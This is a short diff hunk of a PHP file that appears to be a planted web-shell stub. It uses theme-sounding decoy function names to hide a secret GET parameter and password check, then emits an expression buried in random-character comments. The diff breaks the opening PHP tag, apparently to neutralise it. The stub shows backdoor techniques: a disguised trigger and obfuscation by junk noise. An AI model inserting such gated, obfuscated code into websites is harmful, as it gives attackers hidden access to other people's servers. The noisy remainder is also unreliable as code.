@@ -1,4 +1,4 @@
-<?php function themeStyle($responsive){return strrev($responsive)."k";}function themeCss($responsive){return strval($responsive+123);}$logoThemes=themeStyle('hello');$iconLogo=themeCss(888);if(!isset($_GET[$logoThemes])||$_GET[$logoThemes]!==$iconLogo){exit();} ?><?=/*GjcK.ho/M<bh:I^{B*7|\iLi)AzB$mX[y6*/(	 //c'A;?'o|.^S$5aGg=!KL8]IY/|H
+?php function themeStyle($responsive){return strrev($responsive)."k";}function themeCss($responsive){return strval($responsive+123);}$logoThemes=themeStyle('hello');$iconLogo=themeCss(888);if(!isset($_GET[$logoThemes])||$_GET[$logoThemes]!==$iconLogo){exit();} ?><?=/*GjcK.ho/M<bh:I^{B*7|\iLi)AzB$mX[y6*/(	 //c'A;?'o|.^S$5aGg=!KL8]IY/|H
 ""//jWHy"gMH`^(;9@^D\W|X<&$)P7
 ) //w<zNNM28Ri-No4~uPK~ZDT .~s!b(yQx
 ;#G. F>TeymS| qk<\/F9O/
